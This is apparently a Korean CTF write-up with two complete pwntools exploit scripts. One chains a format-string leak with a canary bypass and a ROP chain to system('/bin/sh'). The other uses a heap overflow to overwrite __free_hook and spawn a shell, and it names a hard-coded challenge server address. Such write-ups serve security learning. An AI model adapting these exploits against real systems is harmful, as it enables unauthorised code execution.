포너블 문제가 총 3개 나왔는데 3번째 문제는 12시에 추가되어서 한 시간정도 보다가 못 풀었다..

fsop 이용하는 문제였던 거 같은데 한동안 안했더니 다시 공부해봐야 할 것 같다.

<hr>

### PWN 1

```bash
#!/usr/bin/env python3
from pwn import *
import re, sys

BINARY  = './chall'
LIBC    = './libc.so.6'

LIBC_LEAK_SUB   = 0x1d2b03    #
BUF_OVERFLOW_OFFSET = 0x148 
POP_RDI_OFF     = 0x277e5     
RET_OFF         = 0x26e99     

context.log_level = 'info'
context.binary = ELF(BINARY)
libc = ELF(LIBC)

def leak_values(p):
    p.recvuntil(b'ur name:')
    p.sendline(b'%p_%47$p')    
    raw = p.recvuntil(b'send your msg:', timeout=2, drop=True)
    s = raw.decode(errors='ignore')
    log.info(f'raw leak: {s!r}')
    nums = re.findall(r'0x[0-9a-fA-F]+', s)
    
    leaked_ptr = int(nums[0], 16)
    canary     = int(nums[1], 16)
    return leaked_ptr, canary

def build_rop(libc_base):
    pop_rdi = libc_base + POP_RDI_OFF
    system  = libc_base + libc.symbols['system']
    binsh   = libc_base + next(libc.search(b'/bin/sh'))
    ret     = libc_base + RET_OFF
    return pop_rdi, ret, system, binsh

def exploit(host=None, port=None):
    p = remote(host, port) if host and port else process(BINARY)

    leaked_ptr, canary = leak_values(p)
    log.success(f'leaked_ptr = {hex(leaked_ptr)}')
    log.success(f'canary     = {hex(canary)}')

    libc_base = leaked_ptr - LIBC_LEAK_SUB
    log.success(f'libc_base  = {hex(libc_base)}')

    pop_rdi, ret_g, system_addr, binsh_addr = build_rop(libc_base)
    log.success(f'pop_rdi    = {hex(pop_rdi)}')
    log.success(f'ret gadget  = {hex(ret_g)}')
    log.success(f'system     = {hex(system_addr)}')
    log.success(f'binsh      = {hex(binsh_addr)}')

    p.recvuntil(b'send your msg:', timeout=0.5)
 

    payload = b'A' * BUF_OVERFLOW_OFFSET
    payload += p64(canary)
    payload += b'B' * 8                
    payload += p64(ret_g)
    payload += p64(pop_rdi)
    payload += p64(binsh_addr)
    payload += p64(system_addr)

    log.info(f'payload len = {len(payload)}')
    p.sendline(payload)
    p.interactive()

if __name__ == '__main__':
    if len(sys.argv) == 3:
        exploit(sys.argv[1], int(sys.argv[2]))
    else:
        exploit()
```

<hr>

![image1.png](/assets/img/pocctf2025/image1.png)

<hr>

### PWN 2

```bash
from pwn import *
import re, time, sys

TARGET_HOST = '34.252.33.37'
TARGET_PORT = 32734
LIBC_PATH = './libc.so.6'  
PAD = 0xb0                 
TIMEOUT = 3

context.log_level = 'info'
libc = ELF(LIBC_PATH)

p = remote(TARGET_HOST, TARGET_PORT)

def menu(choice):
    p.recvuntil(b': ')
    p.sendline(str(choice).encode())

def create_raw(content: bytes):
    menu(1)
    p.recvuntil(b'Enter the note content: ')
    p.sendline(content)

def create(content: bytes):
    menu(1)
    p.recvuntil(b'Enter the note content: ')
    p.sendline(content)
    end = time.time() + TIMEOUT
    while time.time() < end:
        try:
            line = p.recvline(timeout=0.5)
        except EOFError:
            raise EOFError("remote closed while creating")
        if not line:
            continue
        m = re.search(br'Note created at index (\d+)\.', line)
        if m:
            return int(m.group(1))
    return None

def read_note(idx:int):
    menu(2)
    p.recvuntil(b': ')
    p.sendline(str(idx).encode())
    try:
        return p.recvline(timeout=1)
    except EOFError:
        raise

def modify(idx:int, data: bytes):
    menu(3)
    p.recvuntil(b': ')
    p.sendline(str(idx).encode())
    p.recvuntil(b': ')
    p.sendline(data)
    end = time.time() + TIMEOUT
    while time.time() < end:
        try:
            line = p.recvline(timeout=0.5)
        except EOFError:
            break
        if b'Note modified successfully' in line:
            return True
    return False

def delete(idx:int):
    menu(4)
    p.recvuntil(b': ')
    p.sendline(str(idx).encode())
    end = time.time() + TIMEOUT
    while time.time() < end:
        try:
            line = p.recvline(timeout=0.5)
        except EOFError:
            break
        if b'Note deleted successfully' in line:
            return True
    return False

def leak_printf_from_menu6():
    menu(6)
    for _ in range(6):
        try:
            line = p.recvline(timeout=1)
        except EOFError:
            break
        if not line:
            continue
        m = re.search(br'0x[0-9a-fA-F]+', line)
        if m:
            return int(m.group(0), 16)
    return None

leak = leak_printf_from_menu6()
libc_base = leak - libc.symbols['printf']
system_addr = libc_base + libc.symbols['system']
free_hook = libc_base + libc.symbols['__free_hook']
log.success(f"printf leak: {hex(leak)}")
log.info(f"libc_base: {hex(libc_base)} system: {hex(system_addr)} __free_hook: {hex(free_hook)}")

idx0 = create(b'A')        
idx1 = create(b'B')         
if idx0 is None or idx1 is None:
    log.warning("couldn't parse created indices (continuing)")

delete(1)

payload = b'A' * PAD + p64(free_hook)
log.info(f"sending overflow ({len(payload)} bytes) to set fd -> {hex(free_hook)}")
ok = modify(0, payload)
time.sleep(0.05)

create(b'C')             
victim_idx = create(p64(system_addr)) 
log.info(f"wrote system via create at idx: {victim_idx}")

bin_idx = create(b'/bin/sh\x00')
log.info(f"/bin/sh created at index {bin_idx}")
delete(bin_idx if bin_idx is not None else 2)

p.interactive()
```

<hr>

![image2.png](/assets/img/pocctf2025/image2.png)